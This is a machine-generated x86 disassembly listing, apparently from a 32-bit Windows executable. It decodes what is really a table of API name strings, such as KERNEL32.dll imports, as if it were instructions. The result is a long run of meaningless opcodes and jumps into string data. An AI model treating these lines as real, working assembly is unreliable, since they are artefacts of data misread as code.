  429405:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42940c:	jns    0x429465
  42940e:	add    BYTE PTR [eax],al
  429410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429411:	add    BYTE PTR [ebx+0x61],al
  429414:	outs   dx,BYTE PTR ds:[esi]
  429415:	arpl   WORD PTR [ebp+0x6c],sp
  429418:	push   edi
  429419:	popa   
  42941a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  429422:	ins    DWORD PTR es:[edi],dx
  429423:	gs jb  0x429426
  429426:	add    al,0x2
  429428:	inc    edi
  429429:	gs je  0x429478
  42942c:	outs   dx,DWORD PTR ds:[esi]
  42942d:	arpl   WORD PTR [ecx+0x6c],sp
  429430:	gs dec ecx
  429432:	outs   dx,BYTE PTR ds:[esi]
  429433:	outs   dx,WORD PTR ds:[esi]
  429435:	inc    ecx
  429436:	add    BYTE PTR [eax],al
  429438:	xor    eax,0x766f4d03
  42943d:	gs inc esi
  42943f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  429447:	gs je  0x42948d
  42944a:	outs   dx,DWORD PTR ds:[esi]
  42944b:	ins    DWORD PTR es:[edi],dx
  42944c:	ins    DWORD PTR es:[edi],dx
  42944d:	push   ebx
  42944e:	je     0x4294b1
  429450:	je     0x4294b7
  429452:	add    BYTE PTR [eax],al
  429454:	mov    ah,0x3
  429456:	push   edx
  429457:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429460:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429468:	ins    BYTE PTR es:[di],dx
  42946a:	gs dec edi
  42946c:	bound  ebp,QWORD PTR [edx+0x65]
  42946f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429473:	add    al,BYTE PTR [edi+0x65]
  429476:	je     0x4294cb
  429478:	jns    0x4294ed
  42947a:	je     0x4294e1
  42947c:	ins    DWORD PTR es:[edi],dx
  42947d:	push   esp
  42947e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429485:	jae    0x4294fb
  429487:	ins    DWORD PTR es:[edi],dx
  429488:	outs   dx,BYTE PTR gs:[esi]
  42948a:	je     0x42948c
  42948c:	add    al,0x1
  42948e:	inc    esp
  42948f:	gs ins BYTE PTR es:[edi],dx
  429491:	gs je  0x4294f9
  429494:	inc    esi
  429495:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42949d:	gs je  0x4294f3
  4294a0:	push   0x5074726f
  4294a5:	popa   
  4294a6:	je     0x429510
  4294a8:	dec    esi
  4294a9:	popa   
  4294aa:	ins    DWORD PTR es:[edi],dx
  4294ab:	gs inc ecx
  4294ad:	add    BYTE PTR [edx],al
  4294af:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  4294b3:	gs je  0x42951b
  4294b6:	inc    ebx
  4294b7:	jb     0x429522
  4294b9:	je     0x429524
  4294bb:	arpl   WORD PTR [ecx+0x6c],sp
  4294be:	push   ebx
  4294bf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4294c4:	outs   dx,BYTE PTR ds:[esi]
  4294c5:	add    bl,ah
  4294c7:	add    BYTE PTR [ebx+0x72],al
  4294ca:	gs popa 
  4294cc:	je     0x429533
  4294ce:	dec    esi
  4294cf:	popa   
  4294d0:	ins    DWORD PTR es:[edi],dx
  4294d1:	gs fs push eax
  4294d4:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  4294db:	add    cl,BYTE PTR [ecx+0x73]
  4294de:	inc    edx
  4294df:	popa   
  4294e0:	fs push edx
  4294e2:	gs popa 
  4294e4:	fs push eax
  4294e6:	je     0x42955a
  4294e8:	add    BYTE PTR [eax],al
  4294ea:	jnp    0x4294ee
  4294ec:	inc    edi
  4294ed:	gs je  0x429545
  4294f0:	jae    0x429557
  4294f2:	jb     0x429538
  4294f4:	gs popaw 
  4294f7:	jne    0x429565
  4294f9:	je     0x429547
  4294fb:	inc    ebx
  4294fc:	dec    ecx
  4294fd:	inc    esp
  4294fe:	add    BYTE PTR [eax],al
  429500:	inc    ebp
  429501:	add    al,BYTE PTR [edi+0x65]
  429504:	je     0x429556
  429506:	jb     0x429577
  429508:	arpl   WORD PTR [ecx+0x64],ax
  42950b:	fs jb  0x429573
  42950e:	jae    0x429583
  429510:	add    BYTE PTR [eax],al
  429512:	mov    BYTE PTR [ebx],0x52
  429515:	gs jae 0x42957d
  429518:	je     0x42955f
  42951a:	jbe    0x429581
  42951c:	outs   dx,BYTE PTR ds:[esi]
  42951d:	je     0x42951f
  42951f:	add    BYTE PTR [edx+0x656c4300],ch
  429525:	popa   
  429526:	jb     0x42956b
  429528:	outs   dx,DWORD PTR ds:[esi]
  429529:	ins    DWORD PTR es:[edi],dx
  42952a:	ins    DWORD PTR es:[edi],dx
  42952b:	inc    ebp
  42952c:	jb     0x4295a0
  42952e:	outs   dx,DWORD PTR ds:[esi]
  42952f:	jb     0x429531
  429531:	add    BYTE PTR [eax+0x61654802],bh
  429537:	jo     0x42958e
  429539:	outs   dx,BYTE PTR ds:[esi]
  42953a:	ins    BYTE PTR es:[edi],dx
  42953b:	outs   dx,DWORD PTR ds:[esi]
  42953c:	arpl   WORD PTR [ebx+0x0],bp
  42953f:	add    dh,ch
  429541:	add    edx,DWORD PTR [ebx+0x65]
  429544:	je     0x429589
  429546:	outs   dx,DWORD PTR ds:[esi]
  429547:	ins    DWORD PTR es:[edi],dx
  429548:	ins    DWORD PTR es:[edi],dx
  429549:	push   ebx
  42954a:	je     0x4295ad
  42954c:	je     0x4295b3
  42954e:	add    BYTE PTR [eax],al
  429550:	out    dx,eax
  429551:	add    DWORD PTR [edi+0x65],eax
  429554:	je     0x42959c
  429556:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42955e:	bound  esi,QWORD PTR [ebp+0x74]
  429561:	gs jae 0x4295a5
  429564:	add    BYTE PTR [eax],al
  429566:	sub    al,0x1
  429568:	inc    ebp
  429569:	outs   dx,BYTE PTR ds:[esi]
  42956a:	jne    0x4295d9
  42956c:	push   ebx
  42956d:	jns    0x4295e2
  42956f:	je     0x4295d6
  429571:	ins    DWORD PTR es:[edi],dx
  429572:	dec    esp
  429573:	outs   dx,DWORD PTR ds:[esi]
  429574:	arpl   WORD PTR [ecx+0x6c],sp
  429577:	gs jae 0x4295bb
  42957a:	add    BYTE PTR [eax],al
  42957c:	sub    eax,0x74655304
  429581:	dec    esp
  429582:	outs   dx,DWORD PTR ds:[esi]
  429583:	arpl   WORD PTR [ecx+0x6c],sp
  429586:	push   esp
  429587:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42958e:	inc    ebp
  42958f:	outs   dx,BYTE PTR ds:[esi]
  429590:	jne    0x4295ff
  429592:	push   edx
  429593:	gs jae 0x429605
  429596:	jne    0x42960a
  429598:	arpl   WORD PTR [ebp+0x4e],sp
  42959b:	popa   
  42959c:	ins    DWORD PTR es:[edi],dx
  42959d:	gs jae 0x4295f7
  4295a0:	add    BYTE PTR [eax],al
  4295a2:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  4295a9:	gs add BYTE PTR gs:[ebx],ah
  4295ad:	add    al,0x53
  4295af:	gs je  0x4295f8
  4295b2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4295ba:	gs jb  0x4295bd
  4295bd:	add    BYTE PTR [edi+0x1],ch
  4295c0:	inc    esi
  4295c1:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4295c8:	jne    0x42963c
  4295ca:	arpl   WORD PTR [ebp+0x41],sp
  4295cd:	add    BYTE PTR ds:0x6c654401,al
  4295d3:	gs je  0x42963b
  4295d6:	inc    esi
  4295d7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  4295df:	gs je  0x429625
  4295e2:	outs   dx,DWORD PTR ds:[esi]
  4295e3:	ins    DWORD PTR es:[edi],dx
  4295e4:	jo     0x42965b
  4295e6:	je     0x42964d
  4295e8:	jb     0x429638
  4295ea:	popa   
  4295eb:	ins    DWORD PTR es:[edi],dx
  4295ec:	gs inc ebp
  4295ee:	js     0x429631
  4295f0:	add    BYTE PTR [eax],al
  4295f2:	cmp    BYTE PTR [ebx],al
  4295f4:	dec    ebp
  4295f5:	outs   dx,DWORD PTR ds:[esi]
  4295f6:	jbe    0x42965d
  4295f8:	inc    esi
  4295f9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  429601:	dec    esi
  429602:	inc    ebp
  429603:	dec    esp
  429604:	xor    esi,DWORD PTR [edx]
  429606:	cs fs ins BYTE PTR es:[edi],dx
  429609:	ins    BYTE PTR es:[edi],dx
  42960a:	add    BYTE PTR [eax],al
  42960c:	add    BYTE PTR [eax],al
  42960e:	add    BYTE PTR [eax],al
  429610:	jp     0x429634
  429612:	add    al,BYTE PTR [eax]
	...
  429630:	dec    ebx
  429631:	xchg   esi,eax
  429632:	add    al,BYTE PTR [eax]
	...
  429640:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  429648:	outs   dx,DWORD PTR ds:[esi]
  429649:	ins    DWORD PTR es:[edi],dx
  42964a:	add    BYTE PTR [ebx+0x72],al
  42964d:	je     0x4296a3
  42964f:	push   0x64616572
  429654:	inc    ebp
  429655:	js     0x429698
  429657:	inc    eax
  429658:	cmp    BYTE PTR [eax],al
